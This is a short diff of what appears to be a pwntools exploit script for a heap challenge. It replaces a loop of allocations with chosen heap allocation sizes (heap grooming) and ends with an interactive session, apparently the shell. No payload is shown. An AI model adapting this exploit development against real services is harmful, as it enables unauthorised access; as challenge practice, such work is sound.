@@ -37,11 +37,8 @@ def alloc(size, content):
 
 #try to allocate a big one.
 
-alloc(20971520-0x23f4, "saybig")
-alloc(2097152, "saybig2")
-
-for i in range(1):
-
-    alloc(131072, "say" + str(i))
+alloc(20971520-0x23f4, "saybig") #0
+alloc(0xea0, "init") #1
+alloc(0x2000, "a"*11) #2 modify code from here!!!
 
 p.interactive()
